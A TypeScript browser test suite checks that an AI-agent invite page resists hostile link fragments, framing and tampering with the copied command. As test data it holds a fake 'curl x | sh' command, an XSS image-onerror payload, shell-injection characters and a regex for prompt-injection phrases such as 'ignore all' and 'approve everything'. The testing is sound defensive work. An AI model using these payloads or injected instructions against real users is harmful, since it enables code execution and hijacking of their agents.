// M1-19 (S1, I-2, I-5; 08 §4, 11 §6.5, D-53) and U3-invite (S2; 08 §4 "One step from an invite
// link", b11 §33.1): the built page in Chromium, where Trusted Types is enforced. The site is built
// with the real build and served by a small server that sends the headers of site/_headers. The
// fragment is hostile input: nothing derived from it may become a DOM element, run, be sent anywhere
// or be stored; each Copy button yields exactly its template plus the canonical link, with no line
// break; a crafted fragment shows the damaged state with no command and no sentence; a framing
// attempt is refused.
import { readFileSync } from 'node:fs';
import { createServer, type Server } from 'node:http';
import type { AddressInfo } from 'node:net';
import { fileURLToPath } from 'node:url';
import { build } from 'vite';
import { chromium, type Browser, type BrowserContext, type Page } from 'playwright';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { NODE_DOWNLOAD_URL, buildAskAi, buildJoinCommand } from '@4thtech-io/invite';
import { CSP, headersFor } from './invite/headers.js';
import {
  BASE_INVITE,
  HOSTILE_NAMES,
  PREFIX,
  futureLink,
  futureExpiry,
  payloadOf,
  rawPayload,
} from './invite/fixtures.js';

const root = fileURLToPath(new URL('../../apps/invite', import.meta.url));
const OUT = fileURLToPath(new URL('../../apps/invite/dist/site/', import.meta.url));
const headerFile = readFileSync(
  fileURLToPath(new URL('../../apps/invite/site/_headers', import.meta.url)),
  'utf8',
);
// axe-core (devDependency of this package), injected only in a CSP-bypassing test context.
const AXE = readFileSync(
  fileURLToPath(new URL('../node_modules/axe-core/axe.min.js', import.meta.url)),
  'utf8',
);

const TYPES: Record<string, string> = {
  '.html': 'text/html; charset=utf-8',
  '.js': 'text/javascript; charset=utf-8',
  '.css': 'text/css; charset=utf-8',
};

/** Serves OUT like the static host does: `/` and `/i` are pages, with the `_headers` headers. */
function serve(): Promise<Server> {
  const server = createServer((req, res) => {
    const path = (req.url ?? '/').split(/[?#]/)[0] ?? '/';
    const file = path === '/' ? 'index.html' : path === '/i' ? 'i/index.html' : path.slice(1);
    try {
      if (file.includes('..') || file.startsWith('_')) throw new Error('not found');
      const body = readFileSync(`${OUT}${file}`);
      const ext = file.slice(file.lastIndexOf('.'));
      res.writeHead(200, {
        'content-type': TYPES[ext] ?? 'text/plain',
        ...headersFor(headerFile, path),
      });
      res.end(body);
    } catch {
      res.writeHead(404, { 'content-type': 'text/plain', ...headersFor(headerFile, path) });
      res.end('not found');
    }
  });
  return new Promise((resolve) => server.listen(0, '127.0.0.1', () => resolve(server)));
}

/** A page that tries to frame the invite page from another origin. */
function serveFramer(target: string): Promise<Server> {
  const server = createServer((_req, res) => {
    res.writeHead(200, { 'content-type': 'text/html' });
    res.end(`<!doctype html><iframe id="f" src="${target}" width="600" height="400"></iframe>`);
  });
  return new Promise((resolve) => server.listen(0, '127.0.0.1', () => resolve(server)));
}

const originOf = (server: Server): string =>
  `http://localhost:${(server.address() as AddressInfo).port}`;

let site: Server;
let framer: Server;
let browser: Browser;

beforeAll(async () => {
  await build({
    root,
    configFile: fileURLToPath(new URL('../../apps/invite/vite.config.ts', import.meta.url)),
    logLevel: 'silent',
  });
  site = await serve();
  browser = await chromium.launch();
}, 120_000);

afterAll(async () => {
  await browser?.close();
  site?.close();
  framer?.close();
});

/** Records everything that could carry the fragment out of the page. */
interface Probe {
  requests: { url: string; method: string; headers: Record<string, string>; body: string | null }[];
  violations: string[];
  consoleErrors: string[];
  beacons: unknown[];
}

async function open(
  fragment: string,
  options: { hash?: boolean } = {},
): Promise<{ page: Page; context: BrowserContext; probe: Probe }> {
  const context = await browser.newContext({ permissions: ['clipboard-read', 'clipboard-write'] });
  const page = await context.newPage();
  const probe: Probe = { requests: [], violations: [], consoleErrors: [], beacons: [] };
  page.on('request', (r) =>
    probe.requests.push({
      url: r.url(),
      method: r.method(),
      headers: r.headers(),
      body: r.postData(),
    }),
  );
  page.on('console', (m) => {
    if (m.type() === 'error') probe.consoleErrors.push(m.text());
  });
  page.on('pageerror', (e) => probe.consoleErrors.push(String(e)));
  await page.addInitScript(() => {
    const w = window as unknown as { __violations: string[]; __beacons: unknown[] };
    w.__violations = [];
    w.__beacons = [];
    document.addEventListener('securitypolicyviolation', (e) =>
      w.__violations.push(`${e.violatedDirective}|${e.blockedURI}`),
    );
    navigator.sendBeacon = (...args) => {
      w.__beacons.push(args);
      return false;
    };
  });
  await page.goto(`${originOf(site)}/i${options.hash === false ? '' : '#'}${fragment}`);
  await page.waitForFunction(() => document.getElementById('state')?.dataset.ready === 'true');
  probe.violations = await page.evaluate(
    () => (window as unknown as { __violations: string[] }).__violations,
  );
  probe.beacons = await page.evaluate(
    () => (window as unknown as { __beacons: unknown[] }).__beacons,
  );
  return { page, context, probe };
}

const tagSequence = (page: Page): Promise<string[]> =>
  page.evaluate(() => [...document.body.querySelectorAll('*')].map((e) => e.tagName));

const clipboard = (page: Page): Promise<string> =>
  page.evaluate(() => navigator.clipboard.readText());

describe('the response', () => {
  it('carries the headers of 08 §4 on the page, the script and the style file', async () => {
    for (const path of ['/', '/i', '/invite.js', '/invite.css']) {
      const res = await fetch(`${originOf(site)}${path}`);
      expect(res.status, path).toBe(200);
      expect(res.headers.get('content-security-policy'), path).toBe(CSP);
      expect(res.headers.get('referrer-policy'), path).toBe('no-referrer');
      expect(res.headers.get('x-frame-options'), path).toBe('DENY');
      expect(res.headers.get('set-cookie'), path).toBeNull();
    }
  });

  it('the built site has one script and no source map or other file', async () => {
    const html = await (await fetch(`${originOf(site)}/i`)).text();
    expect(html.match(/<script\b/g)).toHaveLength(1);
    expect((await fetch(`${originOf(site)}/invite.js.map`)).status).toBe(404);
  });
});

describe('a good invite (U3-invite)', () => {
  it('says who invites, in plain words, and shows one step apart from the inviter', async () => {
    const expiresAt = futureExpiry();
    const link = await futureLink({ expiresAt, name: 'Marko' });
    const { page, context } = await open(payloadOf(link));
    await expect(page.locator('#invite-heading').textContent()).resolves.toBe(
      'Marko invites you to connect your AI agents.',
    );
    await expect(page.locator('#inviter').textContent()).resolves.toContain(
      'Takes about 2 minutes.',
    );
    await expect(page.locator('#inviter-name').textContent()).resolves.toBe('“Marko”');
    await expect(page.locator('#inviter-label').textContent()).resolves.toBe('Self-declared');
    await expect(page.locator('#inviter-host').textContent()).resolves.toBe(
      new URL(originOf(site)).host,
    );
    await expect(page.locator('#inviter-fingerprint').textContent()).resolves.toMatch(
      /^[0-9A-F]{4}·[0-9A-F]{4}$/,
    );
    await expect(page.locator('#inviter-expiry').textContent()).resolves.toMatch(
      /^Works once, until \d{1,2} [A-Z][a-z]{2} \d{4}\.$/,
    );
    // The step: our own heading, the command by default, the fixed Node.js link.
    await expect(page.locator('#step-heading').textContent()).resolves.toBe('Set up in 2 minutes');
    await expect(page.locator('#tab-command').getAttribute('aria-selected')).resolves.toBe('true');
    await expect(page.locator('#step-text').textContent()).resolves.toBe(buildJoinCommand(link));
    await expect(page.locator('#step-help').textContent()).resolves.toBe(
      'Paste it into Terminal and press Return. Needs Node.js 22 or later.',
    );
    const node = page.locator('#node-link');
    await expect(node.textContent()).resolves.toBe('Need Node.js? Get it here');
    await expect(node.getAttribute('href')).resolves.toBe(NODE_DOWNLOAD_URL);
    await expect(node.getAttribute('rel')).resolves.toBe('noopener noreferrer');
    await expect(node.getAttribute('target')).resolves.toBe('_blank');
    await expect(page.locator('#next').textContent()).resolves.toBe(
      "AgentLink opens in your browser. Set it up, then accept Marko's invite.",
    );
    // Nothing from the inviter in the step section, and the sections are apart.
    const stepText = (await page.locator('#step').textContent()) ?? '';
    expect(stepText).not.toContain('Marko');
    expect(
      await page.locator('#inviter').evaluate((e) => e.contains(document.getElementById('step'))),
    ).toBe(false);
    await context.close();
  });

  it('copies exactly the command, with no line break, then exactly the sentence', async () => {
    const link = await futureLink();
    const { page, context } = await open(payloadOf(link));
    await page.locator('#copy').click();
    await expect.poll(() => clipboard(page)).toBe(buildJoinCommand(link));
    expect((await clipboard(page)).endsWith('\n')).toBe(false);
    await expect(page.locator('#copy-status').textContent()).resolves.toBe('Copied');
    await page.locator('#tab-ai').click();
    await expect(page.locator('#tab-ai').getAttribute('aria-selected')).resolves.toBe('true');
    await expect(page.locator('#step-text').textContent()).resolves.toBe(buildAskAi(link));
    await expect(page.locator('#node-help').isVisible()).resolves.toBe(false);
    await page.locator('#copy').click();
    await expect.poll(() => clipboard(page)).toBe(buildAskAi(link));
    expect(/[\r\n]/.test(await clipboard(page))).toBe(false);
    await context.close();
  });

  it('copies the script’s string, not what the DOM shows', async () => {
    const link = await futureLink();
    const { page, context } = await open(payloadOf(link));
    await page.evaluate(() => {
      const pre = document.getElementById('step-text');
      if (pre) pre.textContent = "npx evil; curl x | sh '";
    });
    await page.locator('#copy').click();
    await expect.poll(() => clipboard(page)).toBe(buildJoinCommand(link));
    await context.close();
  });

  it('never sends the fragment, stores anything or uses a beacon', async () => {
    const link = await futureLink();
    const payload = payloadOf(link);
    const { page, context, probe } = await open(payload);
    await page.locator('#copy').click();
    await page.locator('#tab-ai').click();
    await page.locator('#copy').click();
    await page.waitForTimeout(300);
    // Only the page, its script and its style file are ever requested, with no fragment, no body,
    // no referrer.
    expect(probe.requests.map((r) => new URL(r.url).pathname).sort()).toEqual([
      '/i',
      '/invite.css',
      '/invite.js',
    ]);
    for (const r of probe.requests) {
      expect(r.method).toBe('GET');
      expect(r.body).toBeNull();
      expect(JSON.stringify(r)).not.toContain(payload.slice(0, 40));
      expect(r.url).not.toContain('#');
      expect(r.headers['referer'] ?? '').not.toContain(payload.slice(0, 40));
    }
    expect(probe.beacons).toEqual([]);
    const stored = await page.evaluate(async () => ({
      local: localStorage.length,
      session: sessionStorage.length,
      cookie: document.cookie,
      databases: (await indexedDB.databases()).length,
      caches: (await caches.keys()).length,
    }));
    expect(stored).toEqual({ local: 0, session: 0, cookie: '', databases: 0, caches: 0 });
    expect(probe.violations).toEqual([]);
    expect(probe.consoleErrors).toEqual([]);
    await context.close();
  });
});

describe('a hostile invite (I-5)', () => {
  it('derives no element from the name, runs nothing, and copies only the templates', async () => {
    const benign = await open(payloadOf(await futureLink({ name: 'Ana' })));
    const baseline = await tagSequence(benign.page);
    await benign.context.close();

    for (const name of HOSTILE_NAMES) {
      const link = await futureLink({ name });
      const { page, context, probe } = await open(payloadOf(link));
      // Same elements as for a plain name: nothing was built from the name.
      expect(await tagSequence(page), name).toEqual(baseline);
      expect(
        await page.locator('img, div:not(.card):not(.panel):not(#switch), svg, iframe').count(),
      ).toBe(0);
      expect(await page.locator('object, embed, form, input, style').count()).toBe(0);
      // The one link is the fixed Node.js link.
      expect(await page.locator('a').count()).toBe(1);
      await expect(page.locator('a').getAttribute('href')).resolves.toBe(NODE_DOWNLOAD_URL);
      expect(await page.locator('script').count()).toBe(1);
      expect(
        await page.evaluate(() => (window as unknown as { __pwned?: number }).__pwned),
      ).toBeUndefined();
      // The shown name is the restricted one, in its own element, quoted; the heading uses it too
      // (or "Someone" on the name rule's fallback).
      const shown = (await page.locator('#inviter-name').textContent()) ?? '';
      expect(shown).toMatch(/^“[\p{L}\p{N} .'·-]{1,45}”$/u);
      const heading = (await page.locator('#invite-heading').textContent()) ?? '';
      expect(heading).toMatch(/^[\p{L}\p{N} .'·-]{1,45} invites you to connect your AI agents\.$/u);
      expect(await page.locator('#inviter-label').textContent()).toBe('Self-declared');
      // The step section never contains anything the inviter chose.
      const stepSection = (await page.locator('#step').textContent()) ?? '';
      expect(stepSection).not.toMatch(/evil|ignore all|approve everything|__pwned|onerror/i);
      await page.locator('#copy').click();
      await expect
        .poll(() => clipboard(page))
        .toBe(buildJoinCommand(`${PREFIX}${payloadOf(link)}`));
      await page.locator('#tab-ai').click();
      await page.locator('#copy').click();
      await expect.poll(() => clipboard(page)).toBe(buildAskAi(`${PREFIX}${payloadOf(link)}`));
      expect(probe.violations, name).toEqual([]);
      expect(probe.consoleErrors, name).toEqual([]);
      await context.close();
    }
  });

  it('enforces Trusted Types: an HTML sink refuses a plain string', async () => {
    const { page, context, probe } = await open(payloadOf(await futureLink()));
    expect(probe.violations).toEqual([]); // the page itself never needs a sink
    const result = await page.evaluate(() => {
      try {
        document.body.innerHTML = '<img src=x>';
        return 'allowed';
      } catch {
        return 'blocked';
      }
    });
    expect(result).toBe('blocked');
    await context.close();
  });
});

describe('states with no command and no sentence', () => {
  async function expectState(fragment: string, state: string): Promise<Page> {
    const { page, context, probe } = await open(fragment);
    await expect(page.locator('#state').getAttribute('data-state')).resolves.toBe(state);
    await expect(page.locator('#state').textContent()).resolves.not.toBe('');
    expect(await page.locator('#step-text').isVisible()).toBe(false);
    expect(await page.locator('#copy').isVisible()).toBe(false);
    expect(await page.locator('#inviter').isVisible()).toBe(false);
    expect(await page.locator('#next').isVisible()).toBe(false);
    expect(await page.locator('#step').evaluate((e) => (e as HTMLElement).hidden)).toBe(true);
    expect((await page.locator('#step-text').textContent()) ?? '').toBe('');
    expect(probe.violations).toEqual([]);
    expect(probe.consoleErrors).toEqual([]);
    await context.close();
    return page;
  }

  it('shows the state for no fragment', () => expectState('', 'none'));
  it('shows the state for an expired invite, naming the inviter only as text', async () => {
    const { page, context } = await open(
      payloadOf(await futureLink({ name: 'Marko', expiresAt: 1_000_000 })),
    );
    await expect(page.locator('#state').textContent()).resolves.toBe(
      'This invite has expired. Ask Marko for a new one.',
    );
    await context.close();
    await expectState(payloadOf(await futureLink({ expiresAt: 1_000_000 })), 'expired');
  });
  it('shows the state for a damaged invite', async () => {
    await expectState('%3Cimg%20src%3Dx%20onerror%3Dwindow.__pwned%3D1%3E', 'damaged');
    await expectState(await rawPayload(JSON.stringify({ ...BASE_INVITE, v: 2 })), 'damaged');
  });
  it('shows a damaged invite when the name does not match the card nameHash (M1-19-b)', async () => {
    // The card is the base card (the hash of its own name); the name was swapped.
    const link = await futureLink({ name: 'Mallory', card: BASE_INVITE.card });
    await expectState(payloadOf(link), 'damaged');
  });
  it('U3-invite: crafted fragments around a good payload are damaged, with no command', async () => {
    const payload = payloadOf(await futureLink());
    for (const bad of [
      "'",
      '"',
      '%20',
      '%0A',
      ';',
      '$(id)',
      '`id`',
      '&',
      '|',
      '^',
      '!',
      '\\',
      '#x',
    ]) {
      await expectState(`${payload}${bad}`, 'damaged');
    }
    await expectState(`${payload.slice(0, 12)}%${payload.slice(12)}`, 'damaged');
  });
  it('shows the state for an oversized invite', () =>
    expectState('A'.repeat(300_000), 'oversized'));
});

describe('accessibility and motion (U3-invite, b11 §33.1)', () => {
  const modes = [
    { name: 'light-360', width: 360, colorScheme: 'light' },
    { name: 'dark-360', width: 360, colorScheme: 'dark' },
    { name: 'light-1280', width: 1280, colorScheme: 'light' },
    { name: 'dark-1280', width: 1280, colorScheme: 'dark' },
  ] as const;

  it('has no WCAG 2.1 A/AA violation (axe), with 44 px targets and no sideways scroll', async () => {
    const link = await futureLink({ name: 'Marko' });
    for (const mode of modes) {
      // bypassCSP only so axe itself can be injected; the page's own code is unchanged.
      const context = await browser.newContext({
        bypassCSP: true,
        viewport: { width: mode.width, height: 900 },
        colorScheme: mode.colorScheme,
        reducedMotion: 'reduce',
      });
      const page = await context.newPage();
      await page.goto(`${originOf(site)}/i#${payloadOf(link)}`);
      await page.waitForFunction(() => document.getElementById('state')?.dataset.ready === 'true');
      await page.addScriptTag({ content: AXE });
      const violations = await page.evaluate(async () => {
        type Run = (d: Document, o: unknown) => Promise<{ violations: { id: string }[] }>;
        const run = (window as unknown as { axe: { run: Run } }).axe.run;
        const result = await run(document, {
          runOnly: { type: 'tag', values: ['wcag2a', 'wcag2aa', 'wcag21a', 'wcag21aa'] },
        });
        return result.violations.map((v) => v.id);
      });
      expect(violations, mode.name).toEqual([]);
      const sizes = await page.evaluate(() =>
        ['tab-command', 'tab-ai', 'copy'].map(
          (id) => document.getElementById(id)?.getBoundingClientRect().height ?? 0,
        ),
      );
      for (const h of sizes) expect(h, mode.name).toBeGreaterThanOrEqual(44);
      expect(
        await page.evaluate(() => document.documentElement.scrollWidth <= window.innerWidth),
        mode.name,
      ).toBe(true);
      // Reduced motion: nothing transitions or animates.
      const moving = await page.evaluate(
        () =>
          [...document.querySelectorAll('*')].filter((e) => {
            const s = getComputedStyle(e);
            return (
              (s.transitionDuration !== '0s' && s.transitionProperty !== 'none') ||
              s.animationName !== 'none'
            );
          }).length,
      );
      expect(moving, mode.name).toBe(0);
      await context.close();
    }
  });
});

describe('framing', () => {
  it('is refused: the invite page does not load inside another page', async () => {
    const link = await futureLink();
    framer = await serveFramer(`${originOf(site)}/i#${payloadOf(link)}`);
    const context = await browser.newContext();
    const page = await context.newPage();
    await page.goto(originOf(framer));
    await page.waitForTimeout(1_000);
    const frame = page.frames().find((f) => f !== page.mainFrame());
    expect(frame).toBeDefined();
    expect(await frame?.locator('#step-text').count()).toBe(0);
    expect(await frame?.locator('#copy').count()).toBe(0);
    await context.close();
  });
});
